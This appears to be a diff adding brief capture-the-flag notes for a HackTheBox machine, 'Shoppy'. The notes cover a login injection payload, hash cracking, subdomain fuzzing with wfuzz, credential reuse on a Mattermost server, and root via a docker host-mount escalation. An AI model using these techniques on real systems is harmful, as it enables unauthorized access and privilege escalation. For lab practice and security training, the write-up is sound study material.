@@ -1,0 +1,33 @@
+ user pwn:
+Logged in to shoppy.htb/login
+    Entered admin'||' into the username field
+Used the "Search for users" button
+    Entered admin'||' "SELECT" and found the josh user
+Used decode.fr to find the plaintext password of josh's password hash
+
+sudo apt install seclists
+sudo wfuzz -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'FUZZ.10.10.11.180' -H "Host: shoppy.htb" -v
+sudo nano /etc/hosts
+    Added mattermost.shoppy.htb to /etc/hosts
+
+Logged into mattermost.shoppy.htb with josh's creds
+Found jaeger creds in Deploy machine channel
+ 
+ssh jaeger@10.10.11.180
+ls -la
+cat user.txt
+
+root escalation commands:
+cd /home/deploy
+ls -la
+less password-manager
+sudo -l
+sudo --user=deploy ./password-manager
+su deploy
+id
+docker images
+docker run alpine
+docker run -it --rm -v /:/host alpine:latest
+cd /host/root
+cat root.txt 
+
